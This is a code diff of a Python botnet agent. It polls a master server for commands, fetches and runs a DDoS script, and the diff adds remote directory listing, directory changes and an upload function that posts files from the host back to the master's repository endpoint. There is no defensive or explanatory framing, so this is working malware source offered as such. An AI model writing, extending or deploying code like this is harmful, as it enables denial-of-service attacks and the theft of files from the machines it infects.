@@ -1,18 +1,27 @@
-from flask import Flask
+# from flask import Flask
 from subprocess import Popen, PIPE
 import requests
 import time
 import shutil
+import inspect
+import os
+import json
 
-MASTER_IP = "192.168.1.39"
+MASTER_IP = "localhost"
 MASTER_PORT = "5000"
 SERVING_PORT = "8989"
+
+result = ""
 
 
 def get_command():
     command = requests.get("http://" + MASTER_IP + ":" + MASTER_PORT + "/get_command")
     print("Command is:", command.content.decode('ascii'))
     return command.content.decode('ascii')
+
+def parse_ret_val(ret_val):
+    arr = ret_val.split()
+    return tuple(arr)
 
 def get_script():
     while 1:
@@ -31,22 +40,66 @@ def launchDDoS():
     out, err = proc.communicate()
     print(out, err)
 
+def ls(path):
+    global result
+    result = [file for file in os.listdir(path)]
+    
+def pwd():
+    global result
+    result = os.getcwd()
+
+def cd(path):
+    global result
+    os.chdir(path)
+    result = os.getcwd()
+
+def send_result():
+    global result
+    # print(result)
+    while 1:
+        try:
+            requests.post("http://" + MASTER_IP + ":" + MASTER_PORT + "/result", json=json.dumps(result))
+            return
+        except Exception as e:
+            print(e)
+
+def upload(file_name):
+    global result
+    files = [file for file in os.listdir()]
+    if file_name not in files:
+        result = "File does not exist"
+        send_result()
+    else:
+        with open(file_name, 'rb') as f:
+            r = requests.post("http://" + MASTER_IP + ":" + MASTER_PORT + "/repository", files={file_name:f})
+
 steps = {
     "DDoS": (get_script, launchDDoS),
-    "Standby": ()
+    "Standby": (),
+    "ls" : (ls, send_result),
+    "cd" : (cd, send_result),
+    "pwd" : (pwd, send_result),
+    "upload" : (upload)
 }
 
 def run():
     while True:
-        print("In")
         command  =  get_command()
-        if str(command) not in steps:
+        command = parse_ret_val(command)
+        if str(command[0]) not in steps:
+            time.sleep(5)
             continue
         else:
-            for step in steps[command]:
-                print("Gi")
-                step()
-            time.sleep(100)
+            for step in steps[command[0]]:
+                args = inspect.getargspec(step)[0]
+                assert(isinstance(args, list))
+                if 'path' in args or 'file_name' in args:
+                    step(command[1])
+                elif 'result' in args:
+                    step()
+                else:
+                    step()
+            time.sleep(5)
 
 if __name__ == "__main__":
     run()
